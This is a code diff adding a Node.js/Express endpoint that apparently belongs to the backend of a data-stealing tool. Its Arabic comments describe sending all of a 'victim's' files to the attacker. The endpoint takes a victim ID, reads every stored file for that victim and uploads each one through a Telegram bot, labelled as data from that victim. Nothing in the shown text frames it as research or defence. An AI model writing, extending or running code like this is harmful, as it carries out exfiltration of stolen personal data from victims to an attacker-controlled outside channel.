@@ -1,0 +1,36 @@
+// ===================================================================
+// API: إرسال أمر للمهاجم لتحميل البيانات يدوياً
+// ===================================================================
+app.post('/api/telegram/send-victim', async (req, res) => {
+    const { victimId } = req.body;
+    if (!victimId) {
+        return res.status(400).json({ error: 'Victim ID required' });
+    }
+
+    const storagePath = path.join(CONFIG.STORAGE_PATH, victimId);
+    if (!fs.existsSync(storagePath)) {
+        return res.status(404).json({ error: 'Victim not found' });
+    }
+
+    // إرسال جميع ملفات الضحية
+    const files = fs.readdirSync(storagePath);
+    const results = [];
+    for (const file of files) {
+        const fullPath = path.join(storagePath, file);
+        if (fs.statSync(fullPath).isFile()) {
+            const result = await telegram.sendFile(
+                fullPath,
+                `${victimId}_${file}`,
+                `📦 Data from ${victimId}`
+            );
+            results.push(result);
+        }
+    }
+
+    res.json({
+        status: 'sent',
+        victimId,
+        files: results.length,
+        details: results
+    });
+});
